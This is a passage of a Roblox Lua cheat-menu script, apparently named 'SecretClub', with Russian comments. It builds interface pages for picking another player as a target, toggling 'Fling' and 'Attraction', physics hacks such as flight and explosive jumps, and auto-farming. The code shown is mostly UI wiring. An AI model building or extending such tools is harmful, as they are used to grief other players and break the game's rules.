                PlayerNameLabel.Size = UDim2.new(1, -70, 0, 14)
                PlayerNameLabel.Position = UDim2.new(0, 36, 0, 4)
                PlayerNameLabel.BackgroundTransparency = 1
                PlayerNameLabel.Text = plr.DisplayName
                PlayerNameLabel.Font = Enum.Font.GothamBold
                PlayerNameLabel.TextSize = 11
                PlayerNameLabel.TextColor3 = Color3.fromRGB(220, 220, 220)
                PlayerNameLabel.TextXAlignment = Enum.TextXAlignment.Left
                PlayerNameLabel.TextTruncate = Enum.TextTruncate.AtEnd
                PlayerNameLabel.ZIndex = 103
                PlayerNameLabel.Parent = PlayerBtn
                
                -- Username
                local UsernameLabel = Instance.new("TextLabel")
                UsernameLabel.Size = UDim2.new(1, -70, 0, 12)
                UsernameLabel.Position = UDim2.new(0, 36, 0, 17)
                UsernameLabel.BackgroundTransparency = 1
                UsernameLabel.Text = "@" .. plr.Name
                UsernameLabel.Font = Enum.Font.Gotham
                UsernameLabel.TextSize = 9
                UsernameLabel.TextColor3 = Color3.fromRGB(140, 140, 140)
                UsernameLabel.TextXAlignment = Enum.TextXAlignment.Left
                UsernameLabel.TextTruncate = Enum.TextTruncate.AtEnd
                UsernameLabel.ZIndex = 103
                UsernameLabel.Parent = PlayerBtn
                
                -- Индикатор выбора
                local SelectedIndicator = Instance.new("Frame")
                SelectedIndicator.Name = "SelectedIndicator"
                SelectedIndicator.Size = UDim2.new(0, 4, 0, 20)
                SelectedIndicator.Position = UDim2.new(0, 2, 0.5, -10)
                SelectedIndicator.BackgroundColor3 = Color3.fromRGB(100, 255, 140)
                SelectedIndicator.BorderSizePixel = 0
                SelectedIndicator.Visible = AttachSettings.target == plr.Name
                SelectedIndicator.ZIndex = 104
                SelectedIndicator.Parent = PlayerBtn
                
                local IndicatorCorner = Instance.new("UICorner")
                IndicatorCorner.CornerRadius = UDim.new(1, 0)
                IndicatorCorner.Parent = SelectedIndicator
                
                -- Hover эффект
                PlayerBtn.MouseEnter:Connect(function()
                    TweenService:Create(PlayerBtn, TweenInfo.new(0.15), {
                        BackgroundColor3 = Color3.fromRGB(100, 80, 200)
                    }):Play()
                end)
                
                PlayerBtn.MouseLeave:Connect(function()
                    TweenService:Create(PlayerBtn, TweenInfo.new(0.15), {
                        BackgroundColor3 = Color3.fromRGB(36, 36, 36)
                    }):Play()
                end)
                
                -- Клик по игроку
                PlayerBtn.MouseButton1Click:Connect(function()
                    AttachSettings.target = plr.Name
                    PlayerLabel.Text = "Target: " .. plr.DisplayName
                    PlayerLabel.TextColor3 = Color3.fromRGB(100, 255, 140)
                    
                    -- Обновляем индикаторы выбора
                    for _, btn in pairs(playerButtons) do
                        local indicator = btn:FindFirstChild("SelectedIndicator")
                        if indicator then
                            indicator.Visible = false
                        end
                    end
                    SelectedIndicator.Visible = true
                    
                    -- Закрываем dropdown
                    dropdownOpen = false
                    PlayerDropdown.Visible = false
                    
                    -- Анимация подтверждения
                    TweenService:Create(PlayerBtn, TweenInfo.new(0.1), {
                        BackgroundColor3 = Color3.fromRGB(100, 255, 140)
                    }):Play()
                    task.wait(0.2)
                    TweenService:Create(PlayerBtn, TweenInfo.new(0.2), {
                        BackgroundColor3 = Color3.fromRGB(36, 36, 36)
                    }):Play()
                end)
                
                table.insert(playerButtons, PlayerBtn)
            end
        end
    end
    
    PlayerCount.Text = string.format("Players: %d / %d", count, #Players:GetPlayers() - 1)
    task.wait(0.1)
    PlayerScroll.CanvasSize = UDim2.new(0, 0, 0, PlayerLayout.AbsoluteContentSize.Y + 50)
end

-- Поиск в реальном времени
SearchBox:GetPropertyChangedSignal("Text"):Connect(function()
    updatePlayerList()
end)

-- Открытие/закрытие dropdown
SelectBtn.MouseButton1Click:Connect(function()
    dropdownOpen = not dropdownOpen
    PlayerDropdown.Visible = dropdownOpen
    
    if dropdownOpen then
        updatePlayerList()
        SearchBox.Text = ""
        SearchBox:CaptureFocus()
    end
end)

-- Закрытие при клике вне dropdown
UserInputService.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 and dropdownOpen then
        local mousePos = UserInputService:GetMouseLocation()
        local dropPos = PlayerDropdown.AbsolutePosition
        local dropSize = PlayerDropdown.AbsoluteSize
        local btnPos = SelectBtn.AbsolutePosition
        local btnSize = SelectBtn.AbsoluteSize
        
        local insideDrop = mousePos.X >= dropPos.X and mousePos.X <= dropPos.X + dropSize.X and 
                          mousePos.Y >= dropPos.Y and mousePos.Y <= dropPos.Y + dropSize.Y
        local insideBtn = mousePos.X >= btnPos.X and mousePos.X <= btnPos.X + btnSize.X and 
                         mousePos.Y >= btnPos.Y and mousePos.Y <= btnPos.Y + btnSize.Y
        
        if not insideDrop and not insideBtn then
            dropdownOpen = false
            PlayerDropdown.Visible = false
        end
    end
end)

-- Автообновление списка каждые 3 секунды
task.spawn(function()
    while task.wait(3) do
        if dropdownOpen then
            updatePlayerList()
        end
    end
end)

-- Обновление при входе/выходе игроков
Players.PlayerAdded:Connect(function()
    task.wait(0.5)
    if dropdownOpen then
        updatePlayerList()
    end
end)

Players.PlayerRemoving:Connect(function(plr)
    if AttachSettings.target == plr.Name then
        AttachSettings.target = nil
        PlayerLabel.Text = "Target: None"
        PlayerLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
    end
    if dropdownOpen then
        updatePlayerList()
    end
end)

end

-- ========================================
-- PHYSICS LAB PAGE
-- ========================================
local PhysicsPage, PhysicsLeft, PhysicsRight
do
PhysicsPage, PhysicsLeft, PhysicsRight = createPage()

local PhysicsHeader = createSectionHeader("Physics Lab")
PhysicsHeader.Parent = PhysicsLeft

createToggle(PhysicsLeft, "Black Hole", false, function(enabled) blackholeActive = enabled end)
createToggle(PhysicsLeft, "Vacuum Cannon", false, function(enabled) vacuumActive = enabled end)
createToggle(PhysicsLeft, "Seismic Strike", false, function(enabled) seismicActive = enabled end)
createToggle(PhysicsLeft, "Super Kick", false, function(enabled) kickActive = enabled end)

createToggle(PhysicsRight, "Steel Body", false, function(enabled)
    unshakeable = enabled
    local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if hrp then
        hrp.CustomPhysicalProperties = enabled and PhysicalProperties.new(100, 0.3, 0.5) or nil
    end
end)

createToggle(PhysicsRight, "Spider Mode", false, function(enabled) spiderMode = enabled end)
createToggle(PhysicsRight, "Air Walk", false, function(enabled) airWalk = enabled end)
createToggle(PhysicsRight, "Physics Flight", false, function(enabled) flying_physics = enabled end)

createButton(PhysicsRight, "💥 Explosive Jump", function()
    local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if hrp then
        local exp = Instance.new("Explosion", workspace)
        exp.Position = hrp.Position + Vector3.new(0, -3, 0)
        exp.BlastRadius = 15
        exp.BlastPressure = 1000000
    end
end)

createButton(PhysicsRight, "🔄 Reset All Physics", function()
    seismicActive = false
    vacuumActive = false
    kickActive = false
    spiderMode = false
    airWalk = false
    flying_physics = false
    unshakeable = false
    blackholeActive = false
    workspace.Gravity = 196.2
    local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if hrp then
        if hrp:FindFirstChild("FlyBV") then hrp.FlyBV:Destroy() end
        hrp.CustomPhysicalProperties = nil
    end
end)
end

-- ========================================
-- GHOST HUB PAGE
-- ========================================
local GhostPage, GhostLeft, GhostRight
do
GhostPage, GhostLeft, GhostRight = createPage()

local GhostHeader = createSectionHeader("Fling")
GhostHeader.Parent = GhostLeft

-- ========================================
-- УЛУЧШЕННАЯ ПАНЕЛЬ ВЫБОРА ИГРОКА
-- ========================================
local PlayerSelPanel = Instance.new("Frame")
PlayerSelPanel.Size = UDim2.new(1, 0, 0, 40)
PlayerSelPanel.BackgroundColor3 = Color3.fromRGB(22, 20, 30)
PlayerSelPanel.Parent = GhostLeft

local PlayerSelCorner = Instance.new("UICorner")
PlayerSelCorner.CornerRadius = UDim.new(0, 20)
PlayerSelCorner.Parent = PlayerSelPanel

local PlayerLabel = Instance.new("TextLabel")
PlayerLabel.Size = UDim2.new(0.6, 0, 1, 0)
PlayerLabel.Position = UDim2.new(0, 8, 0, 0)
PlayerLabel.BackgroundTransparency = 1
PlayerLabel.Text = "Target: None"
PlayerLabel.Font = Enum.Font.Gotham
PlayerLabel.TextSize = 11
PlayerLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
PlayerLabel.TextXAlignment = Enum.TextXAlignment.Left
PlayerLabel.Parent = PlayerSelPanel

local SelectBtn = Instance.new("TextButton")
SelectBtn.Size = UDim2.new(0, 80, 0, 28)
SelectBtn.Position = UDim2.new(1, -86, 0.5, -14)
SelectBtn.BackgroundColor3 = Color3.fromRGB(100, 80, 200)
SelectBtn.Text = "Select"
SelectBtn.Font = Enum.Font.Gotham
SelectBtn.TextSize = 11
SelectBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
SelectBtn.BorderSizePixel = 0
SelectBtn.Parent = PlayerSelPanel

local SelectBtnCorner = Instance.new("UICorner")
SelectBtnCorner.CornerRadius = UDim.new(0, 20)
SelectBtnCorner.Parent = SelectBtn

-- ========================================
-- УЛУЧШЕННЫЙ DROPDOWN С ПРОКРУТКОЙ И ПОИСКОМ
-- ========================================
local PlayerDropdown = Instance.new("Frame")
PlayerDropdown.Size = UDim2.new(1, 0, 0, 450)  -- Увеличенная высота
PlayerDropdown.Position = UDim2.new(0, 0, 1, 5)
PlayerDropdown.BackgroundColor3 = Color3.fromRGB(26, 24, 34)
PlayerDropdown.BorderSizePixel = 0
PlayerDropdown.Visible = false
PlayerDropdown.ZIndex = 100
PlayerDropdown.Parent = GhostLeft

local DropdownCorner = Instance.new("UICorner")
DropdownCorner.CornerRadius = UDim.new(0, 20)
DropdownCorner.Parent = PlayerDropdown

local DropdownStroke = Instance.new("UIStroke")
DropdownStroke.Transparency = 1
DropdownStroke.Color = Color3.fromRGB(100, 80, 200)
DropdownStroke.Thickness = 2
DropdownStroke.Parent = PlayerDropdown

-- Поле поиска
local SearchFrame = Instance.new("Frame")
SearchFrame.Size = UDim2.new(1, -16, 0, 32)
SearchFrame.Position = UDim2.new(0, 8, 0, 8)
SearchFrame.BackgroundColor3 = Color3.fromRGB(24, 22, 32)
SearchFrame.BorderSizePixel = 0
SearchFrame.ZIndex = 101
SearchFrame.Parent = PlayerDropdown

local SearchCorner = Instance.new("UICorner")
SearchCorner.CornerRadius = UDim.new(0, 16)
SearchCorner.Parent = SearchFrame

local SearchBox = Instance.new("TextBox")
SearchBox.Size = UDim2.new(1, -20, 1, 0)
SearchBox.Position = UDim2.new(0, 10, 0, 0)
SearchBox.BackgroundTransparency = 1
SearchBox.Text = ""
SearchBox.PlaceholderText = "🔍 Search player..."
SearchBox.Font = Enum.Font.Gotham
SearchBox.TextSize = 11
SearchBox.TextColor3 = Color3.fromRGB(200, 200, 200)
SearchBox.PlaceholderColor3 = Color3.fromRGB(120, 120, 120)
SearchBox.TextXAlignment = Enum.TextXAlignment.Left
SearchBox.ClearTextOnFocus = false
SearchBox.ZIndex = 102
SearchBox.Parent = SearchFrame

-- Счётчик игроков
local PlayerCount = Instance.new("TextLabel")
PlayerCount.Size = UDim2.new(1, -16, 0, 20)
PlayerCount.Position = UDim2.new(0, 8, 0, 45)
PlayerCount.BackgroundTransparency = 1
PlayerCount.Text = "Players: 0"
PlayerCount.Font = Enum.Font.GothamBold
PlayerCount.TextSize = 10
PlayerCount.TextColor3 = Color3.fromRGB(100, 80, 200)
PlayerCount.TextXAlignment = Enum.TextXAlignment.Left
PlayerCount.ZIndex = 101
PlayerCount.Parent = PlayerDropdown

-- ScrollingFrame для списка игроков
local PlayerScroll = Instance.new("ScrollingFrame")
PlayerScroll.Size = UDim2.new(1, -16, 1, -78)
PlayerScroll.Position = UDim2.new(0, 8, 0, 70)
PlayerScroll.BackgroundTransparency = 1
PlayerScroll.ScrollBarThickness = 6
PlayerScroll.ScrollBarImageColor3 = Color3.fromRGB(100, 80, 200)
PlayerScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
PlayerScroll.ScrollingDirection = Enum.ScrollingDirection.Y
PlayerScroll.ZIndex = 102
PlayerScroll.Parent = PlayerDropdown

local PlayerLayout = Instance.new("UIListLayout")
PlayerLayout.Padding = UDim.new(0, 4)
PlayerLayout.Parent = PlayerScroll

-- АВТОМАТИЧЕСКОЕ ОБНОВЛЕНИЕ CANVAS SIZE
PlayerLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
    PlayerScroll.CanvasSize = UDim2.new(0, 0, 0, PlayerLayout.AbsoluteContentSize.Y + 20)
end)


-- ========================================
-- ФУНКЦИЯ ОБНОВЛЕНИЯ СПИСКА ИГРОКОВ
-- ========================================
local playerButtons = {}

local function updatePlayerList()
    -- Очистка старых кнопок
    for _, btn in pairs(playerButtons) do
        if btn and btn.Parent then
            btn:Destroy()
        end
    end
    playerButtons = {}
    
    local searchText = SearchBox.Text:lower()
    local count = 0
    
    -- Создание новых кнопок
    for _, plr in pairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer then
            local displayName = plr.DisplayName:lower()
            local username = plr.Name:lower()
            
            -- Фильтр по поиску
            if searchText == "" or displayName:find(searchText, 1, true) or username:find(searchText, 1, true) then
                count = count + 1
                
                local PlayerBtn = Instance.new("TextButton")
                PlayerBtn.Size = UDim2.new(1, -8, 0, 32)
                PlayerBtn.BackgroundColor3 = Color3.fromRGB(36, 36, 36)
                PlayerBtn.Text = ""
                PlayerBtn.Font = Enum.Font.Gotham
                PlayerBtn.TextSize = 11
                PlayerBtn.BorderSizePixel = 0
                PlayerBtn.ZIndex = 102
                PlayerBtn.Parent = PlayerScroll
                
                local PBCorner = Instance.new("UICorner")
                PBCorner.CornerRadius = UDim.new(0, 16)
                PBCorner.Parent = PlayerBtn
                
                -- Иконка игрока
                local PlayerIcon = Instance.new("TextLabel")
                PlayerIcon.Size = UDim2.new(0, 24, 1, 0)
                PlayerIcon.Position = UDim2.new(0, 8, 0, 0)
                PlayerIcon.BackgroundTransparency = 1
                PlayerIcon.Text = "👤"
                PlayerIcon.Font = Enum.Font.GothamBold
                PlayerIcon.TextSize = 14
                PlayerIcon.TextColor3 = Color3.fromRGB(100, 80, 200)
                PlayerIcon.ZIndex = 103
                PlayerIcon.Parent = PlayerBtn
                
                -- Имя игрока
                local PlayerNameLabel = Instance.new("TextLabel")
                PlayerNameLabel.Size = UDim2.new(1, -70, 0, 14)
                PlayerNameLabel.Position = UDim2.new(0, 36, 0, 4)
                PlayerNameLabel.BackgroundTransparency = 1
                PlayerNameLabel.Text = plr.DisplayName
                PlayerNameLabel.Font = Enum.Font.GothamBold
                PlayerNameLabel.TextSize = 11
                PlayerNameLabel.TextColor3 = Color3.fromRGB(220, 220, 220)
                PlayerNameLabel.TextXAlignment = Enum.TextXAlignment.Left
                PlayerNameLabel.TextTruncate = Enum.TextTruncate.AtEnd
                PlayerNameLabel.ZIndex = 103
                PlayerNameLabel.Parent = PlayerBtn
                
                -- Username
                local UsernameLabel = Instance.new("TextLabel")
                UsernameLabel.Size = UDim2.new(1, -70, 0, 12)
                UsernameLabel.Position = UDim2.new(0, 36, 0, 17)
                UsernameLabel.BackgroundTransparency = 1
                UsernameLabel.Text = "@" .. plr.Name
                UsernameLabel.Font = Enum.Font.Gotham
                UsernameLabel.TextSize = 9
                UsernameLabel.TextColor3 = Color3.fromRGB(140, 140, 140)
                UsernameLabel.TextXAlignment = Enum.TextXAlignment.Left
                UsernameLabel.TextTruncate = Enum.TextTruncate.AtEnd
                UsernameLabel.ZIndex = 103
                UsernameLabel.Parent = PlayerBtn
                
                -- Индикатор выбора
                local SelectedIndicator = Instance.new("Frame")
                SelectedIndicator.Name = "SelectedIndicator"
                SelectedIndicator.Size = UDim2.new(0, 4, 0, 20)
                SelectedIndicator.Position = UDim2.new(0, 2, 0.5, -10)
                SelectedIndicator.BackgroundColor3 = Color3.fromRGB(100, 255, 140)
                SelectedIndicator.BorderSizePixel = 0
                SelectedIndicator.Visible = gh_selectedPlayer == plr
                SelectedIndicator.ZIndex = 104
                SelectedIndicator.Parent = PlayerBtn
                
                local IndicatorCorner = Instance.new("UICorner")
                IndicatorCorner.CornerRadius = UDim.new(1, 0)
                IndicatorCorner.Parent = SelectedIndicator
                
                -- Hover эффект
                PlayerBtn.MouseEnter:Connect(function()
                    TweenService:Create(PlayerBtn, TweenInfo.new(0.15), {
                        BackgroundColor3 = Color3.fromRGB(100, 80, 200)
                    }):Play()
                end)
                
                PlayerBtn.MouseLeave:Connect(function()
                    TweenService:Create(PlayerBtn, TweenInfo.new(0.15), {
                        BackgroundColor3 = Color3.fromRGB(36, 36, 36)
                    }):Play()
                end)
                
                -- Клик по игроку
                PlayerBtn.MouseButton1Click:Connect(function()
                    gh_selectedPlayer = plr
                    PlayerLabel.Text = "Target: " .. plr.DisplayName
                    PlayerLabel.TextColor3 = Color3.fromRGB(100, 255, 140)
                    
                    -- Обновляем индикаторы выбора
                    for _, btn in pairs(playerButtons) do
                        local indicator = btn:FindFirstChild("SelectedIndicator")
                        if indicator then
                            indicator.Visible = false
                        end
                    end
                    SelectedIndicator.Visible = true
                    
                    -- Закрываем dropdown
                    PlayerDropdown.Visible = false
                    
                    -- Анимация подтверждения
                    TweenService:Create(PlayerBtn, TweenInfo.new(0.1), {
                        BackgroundColor3 = Color3.fromRGB(100, 255, 140)
                    }):Play()
                    task.wait(0.2)
                    TweenService:Create(PlayerBtn, TweenInfo.new(0.2), {
                        BackgroundColor3 = Color3.fromRGB(36, 36, 36)
                    }):Play()
                end)
                
                table.insert(playerButtons, PlayerBtn)
            end
        end
    end
    
    -- Обновляем счётчик
    PlayerCount.Text = string.format("Players: %d / %d", count, #Players:GetPlayers() - 1)
    task.wait(0.1)
    PlayerScroll.CanvasSize = UDim2.new(0, 0, 0, PlayerLayout.AbsoluteContentSize.Y + 50)
end   

 

-- Поиск в реальном времени
SearchBox:GetPropertyChangedSignal("Text"):Connect(function()
    updatePlayerList()
end)

-- Открытие/закрытие dropdown
SelectBtn.MouseButton1Click:Connect(function()
    PlayerDropdown.Visible = not PlayerDropdown.Visible
    
    if PlayerDropdown.Visible then
        updatePlayerList()
        SearchBox.Text = ""
        SearchBox:CaptureFocus()
    end
end)

-- Закрытие при клике вне dropdown
UserInputService.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 and PlayerDropdown.Visible then
        local mousePos = UserInputService:GetMouseLocation()
        local dropPos = PlayerDropdown.AbsolutePosition
        local dropSize = PlayerDropdown.AbsoluteSize
        local btnPos = SelectBtn.AbsolutePosition
        local btnSize = SelectBtn.AbsoluteSize
        
        local insideDrop = mousePos.X >= dropPos.X and mousePos.X <= dropPos.X + dropSize.X and 
                          mousePos.Y >= dropPos.Y and mousePos.Y <= dropPos.Y + dropSize.Y
        local insideBtn = mousePos.X >= btnPos.X and mousePos.X <= btnPos.X + btnSize.X and 
                         mousePos.Y >= btnPos.Y and mousePos.Y <= btnPos.Y + btnSize.Y
        
        if not insideDrop and not insideBtn then
            PlayerDropdown.Visible = false
        end
    end
end)

-- ========================================
-- АВТООБНОВЛЕНИЕ СПИСКА КАЖДЫЕ 3 СЕКУНДЫ
-- ========================================
task.spawn(function()
    while task.wait(3) do
        if PlayerDropdown.Visible then
            updatePlayerList()
        end
    end
end)

-- Обновление при входе/выходе игроков
Players.PlayerAdded:Connect(function()
    task.wait(0.5)
    if PlayerDropdown.Visible then
        updatePlayerList()
    end
end)

Players.PlayerRemoving:Connect(function(plr)
    if gh_selectedPlayer == plr then
        gh_selectedPlayer = nil
        PlayerLabel.Text = "Target: None"
        PlayerLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
    end
    if PlayerDropdown.Visible then
        updatePlayerList()
    end
end)

-- Остальные элементы Ghost Hub
createToggle(GhostLeft, "Attraction", false, function(enabled) gh_isRunning = enabled end)
createToggle(GhostLeft, "Fling", false, function(enabled) gh_isFlingActive = enabled end)
createToggle(GhostRight, "Auto Reset", false, function(enabled) gh_isAutoResetEnabled = enabled end)
createToggle(GhostRight, "Auto-Click [K]", false, function(enabled) _G.AutoClicker = enabled end)
createSlider(GhostRight, "Predict", 0, 100, 30, function(value) _G.PredictValue = value / 100 end)
createSlider(GhostRight, "Reset Interval", 1, 10, 5, function(value) gh_resetInterval = value end)
end
-- ========================================
-- SIDEBAR SETUP
-- ========================================
createSidebarLabel("Main", 1)
createSidebarButton("🏃", "Movement", 25, true, Color3.fromRGB(100, 80, 200), MovementPage)
currentActiveButton = allButtons[1].Button

createSidebarLabel("Farm", 60)
createSidebarButton("🌾", "Auto Prestige", 80, false, Color3.fromRGB(80, 200, 100), FarmPage)

createSidebarLabel("Visuals", 115)
createSidebarButton("👤", "Players", 135, false, Color3.fromRGB(100, 80, 200), PlayersPage)

createSidebarLabel("Stand", 170)
createSidebarButton("🎮", "Stand Pilot", 190, false, Color3.fromRGB(140, 100, 255), StandPilotPage)
createSidebarButton("🔗", "Stand Attach", 230, false, Color3.fromRGB(140, 100, 255), AttachPage)

createSidebarLabel("Fun", 265)
createSidebarButton("👻", "Fun & Dance", 283, false, Color3.fromRGB(100, 255, 140), FunPage)

createSidebarLabel("Advanced", 320)
createSidebarButton("⚗️", "Physics Lab", 340, false, Color3.fromRGB(255, 140, 60), PhysicsPage)
createSidebarButton("🌀", "Fling", 380, false, Color3.fromRGB(255, 60, 140), GhostPage)

-- Bottom panel
local BottomPanel = Instance.new("Frame")
BottomPanel.Size = UDim2.new(1, -20, 0, 48)
BottomPanel.Position = UDim2.new(0, 10, 1, -58)
BottomPanel.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
BottomPanel.BorderSizePixel = 0
BottomPanel.Parent = Sidebar

local BottomCorner = Instance.new("UICorner")
BottomCorner.CornerRadius = UDim.new(0, 20)
BottomCorner.Parent = BottomPanel

local ExarationLabel = Instance.new("TextLabel")
ExarationLabel.Size = UDim2.new(1, -20, 0, 16)
ExarationLabel.Position = UDim2.new(0, 10, 0, 8)
ExarationLabel.BackgroundTransparency = 1
ExarationLabel.Text = "SecretClub"
ExarationLabel.Font = Enum.Font.Gotham
ExarationLabel.TextSize = 11
ExarationLabel.TextColor3 = Color3.fromRGB(140, 140, 140)
ExarationLabel.TextXAlignment = Enum.TextXAlignment.Left
ExarationLabel.Parent = BottomPanel

local TimeLabel = Instance.new("TextLabel")
TimeLabel.Size = UDim2.new(1, -20, 0, 16)
TimeLabel.Position = UDim2.new(0, 10, 0, 26)
TimeLabel.BackgroundTransparency = 1
TimeLabel.Text = "v0.1"
TimeLabel.Font = Enum.Font.Gotham
TimeLabel.TextSize = 10
TimeLabel.TextColor3 = Color3.fromRGB(100, 80, 200)
TimeLabel.TextXAlignment = Enum.TextXAlignment.Left
TimeLabel.Parent = BottomPanel


-- ========================================
-- THEME SYSTEM
-- ========================================
local Themes = {
    {Name = "Blue", Color = Color3.fromRGB(100, 80, 200), BgDark = Color3.fromRGB(14, 14, 14), BgMedium = Color3.fromRGB(16, 14, 22), BgLight = Color3.fromRGB(18, 16, 24)},
    {Name = "Purple", Color = Color3.fromRGB(140, 100, 255), BgDark = Color3.fromRGB(14, 10, 20), BgMedium = Color3.fromRGB(20, 14, 26), BgLight = Color3.fromRGB(28, 20, 35)},
    {Name = "Green", Color = Color3.fromRGB(100, 255, 140), BgDark = Color3.fromRGB(10, 18, 12), BgMedium = Color3.fromRGB(14, 24, 16), BgLight = Color3.fromRGB(20, 32, 22)},
    {Name = "Red", Color = Color3.fromRGB(255, 80, 100), BgDark = Color3.fromRGB(18, 10, 10), BgMedium = Color3.fromRGB(24, 14, 14), BgLight = Color3.fromRGB(32, 20, 20)},
    {Name = "Orange", Color = Color3.fromRGB(255, 140, 60), BgDark = Color3.fromRGB(18, 14, 10), BgMedium = Color3.fromRGB(24, 18, 14), BgLight = Color3.fromRGB(32, 24, 18)}
}
local CurrentThemeIndex = 1
local CurrentTheme = Themes[1]  -- Храним текущую тему

local function ApplyTheme(theme)
    CurrentTheme = theme  -- Сохраняем текущую тему
    
    -- MainFrame
    TweenService:Create(MainFrame, TweenInfo.new(0.3), {BackgroundColor3 = theme.BgLight}):Play()
    TweenService:Create(TopBar, TweenInfo.new(0.3), {BackgroundColor3 = theme.BgLight}):Play()
    TweenService:Create(Sidebar, TweenInfo.new(0.3), {BackgroundColor3 = theme.BgMedium}):Play()
    TweenService:Create(Sidebar, TweenInfo.new(0.3), {ScrollBarImageColor3 = theme.Color}):Play()
    TweenService:Create(BottomPanel, TweenInfo.new(0.3), {BackgroundColor3 = theme.BgDark}):Play()
    TweenService:Create(TimeLabel, TweenInfo.new(0.3), {TextColor3 = theme.Color}):Play()
    
    -- Pages background
    for _, page in pairs({MovementPage, PlayersPage, StandPilotPage, FunPage, AttachPage, PhysicsPage, GhostPage}) do
        if page then
            TweenService:Create(page, TweenInfo.new(0.3), {BackgroundColor3 = theme.BgLight}):Play()
        end
    end
    
    -- Обновляем все Toggle переключатели и другие элементы
    for _, page in pairs({MovementPage, PlayersPage, StandPilotPage, FunPage, AttachPage, PhysicsPage, GhostPage}) do
        if page then
            for _, child in pairs(page:GetDescendants()) do
                -- Toggle switches
                if child:IsA("TextButton") and child.Name == "ToggleSwitch" then
                    -- Проверяем активен ли toggle по цвету
                    if child.BackgroundColor3.R > 0.3 or child.BackgroundColor3.G > 0.3 or child.BackgroundColor3.B > 0.3 then
                        TweenService:Create(child, TweenInfo.new(0.3), {BackgroundColor3 = theme.Color}):Play()
                    end
                end
                -- Слайдеры
                if child.Name == "SliderFill" or child.Name == "SliderDot" then
                    TweenService:Create(child, TweenInfo.new(0.3), {BackgroundColor3 = theme.Color}):Play()
                end
            end
        end
    end
    
    -- Обновляем ScrollBars
    if AnimScroll then
        TweenService:Create(AnimScroll, TweenInfo.new(0.3), {ScrollBarImageColor3 = theme.Color}):Play()
    end
    if QSScroll then
        TweenService:Create(QSScroll, TweenInfo.new(0.3), {ScrollBarImageColor3 = theme.Color}):Play()
    end
    
    -- Обновляем иконки в Sidebar
    for _, button in pairs(Sidebar:GetChildren()) do
        if button:IsA("TextButton") and button:FindFirstChild("Icon") then
            local icon = button:FindFirstChild("Icon")
            -- Проверяем активна ли кнопка
            if button.BackgroundColor3 ~= Color3.fromRGB(18, 16, 24) then
                TweenService:Create(button, TweenInfo.new(0.3), {BackgroundColor3 = theme.Color}):Play()
                TweenService:Create(icon, TweenInfo.new(0.3), {TextColor3 = Color3.fromRGB(255, 255, 255)}):Play()
            else
                TweenService:Create(icon, TweenInfo.new(0.3), {TextColor3 = theme.Color}):Play()
            end
        end
    end
    
    -- Обновляем Settings кнопку в TopBar
    for _, child in pairs(TopBar:GetChildren()) do
        if child:IsA("TextButton") and child.Text == "⚙️" then
            local settingsStroke = child:FindFirstChildOfClass("UIStroke")
            if settingsStroke then
                TweenService:Create(settingsStroke, TweenInfo.new(0.3), {Color = theme.Color}):Play()
            end
        end
    end
    
    -- Обновляем MainFrame Stroke
    local mainStroke = MainFrame:FindFirstChildOfClass("UIStroke")
    if mainStroke then
        TweenService:Create(mainStroke, TweenInfo.new(0.3), {Color = theme.Color}):Play()
    end
    
     --Обновляем TopBar Stroke
    local topStroke = TopBar:FindFirstChildOfClass("UIStroke")
    if topStroke then
         TweenService:Create(topStroke, TweenInfo.new(0.3), {Color = theme.Color}):Play()
 end
end

-- ========================================
-- SYSTEM MONITOR (с ИСПРАВЛЕННЫМ Color Picker!)
-- ========================================
do
local MonitorFrame = Instance.new("Frame")
MonitorFrame.Name = "SystemMonitor"
MonitorFrame.Size = UDim2.new(0, 380, 0, 520)
MonitorFrame.Position = UDim2.new(0.5, -190, 0.5, -260)
MonitorFrame.BackgroundColor3 = Color3.fromRGB(18, 16, 24)
MonitorFrame.Visible = false
MonitorFrame.BorderSizePixel = 0
MonitorFrame.ZIndex = 150
MonitorFrame.Parent = ScreenGui

local MonitorCorner = Instance.new("UICorner")
MonitorCorner.CornerRadius = UDim.new(0, 8)
MonitorCorner.Parent = MonitorFrame

local MonitorStroke = Instance.new("UIStroke")
MonitorStroke.Color = Color3.fromRGB(100, 80, 200)
MonitorStroke.Thickness = 2
MonitorStroke.Parent = MonitorFrame

-- Dragging System
local MonitorDragging = false
local MonitorDragInput, MonitorDragStart, MonitorStartPos

local function updateMonitorDrag(input)
    local delta = input.Position - MonitorDragStart
    TweenService:Create(MonitorFrame, TweenInfo.new(0.1), {
        Position = UDim2.new(MonitorStartPos.X.Scale, MonitorStartPos.X.Offset + delta.X, MonitorStartPos.Y.Scale, MonitorStartPos.Y.Offset + delta.Y)
    }):Play()
end

MonitorFrame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        MonitorDragging = true
        MonitorDragStart = input.Position
        MonitorStartPos = MonitorFrame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then MonitorDragging = false end
        end)
    end
end)

MonitorFrame.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement then MonitorDragInput = input end
end)

UserInputService.InputChanged:Connect(function(input)
    if input == MonitorDragInput and MonitorDragging then updateMonitorDrag(input) end
end)

-- Top Bar
local MonitorTopBar = Instance.new("Frame")
MonitorTopBar.Size = UDim2.new(1, 0, 0, 50)
MonitorTopBar.BackgroundColor3 = Color3.fromRGB(16, 14, 22)
MonitorTopBar.BorderSizePixel = 0
MonitorTopBar.ZIndex = 151
MonitorTopBar.Parent = MonitorFrame

local MonitorTopCorner = Instance.new("UICorner")
MonitorTopCorner.CornerRadius = UDim.new(0, 8)
MonitorTopCorner.Parent = MonitorTopBar

local MonitorTitle = Instance.new("TextLabel")
MonitorTitle.Size = UDim2.new(1, -100, 1, 0)
